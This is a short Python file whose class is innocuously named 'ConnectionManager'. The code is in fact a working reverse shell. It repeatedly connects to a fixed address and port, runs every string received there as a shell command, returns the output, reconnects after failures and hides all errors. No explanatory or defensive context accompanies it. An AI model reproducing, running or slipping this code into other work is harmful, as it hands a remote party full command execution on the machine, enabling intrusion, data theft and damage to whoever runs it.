import socket
import subprocess
import threading
import time

class ConnectionManager:
    def __init__(self):
        self.server = "192.168.1.50"
        self.port = 8443
        self.buffer_size = 4096
        
    def establish_stream(self):
        while True:
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.connect((self.server, self.port))
                
                while True:
                    packet = conn.recv(self.buffer_size).decode('utf-8')
                    if not packet:
                        break
                    
                    result = subprocess.check_output(
                        packet, 
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                    conn.sendall(result)
                    
            except:
                time.sleep(10)
                
    def start(self):
        worker = threading.Thread(target=self.establish_stream)
        worker.daemon = True
        worker.start()
        worker.join()

if __name__ == "__main__":
    manager = ConnectionManager()
    manager.start()
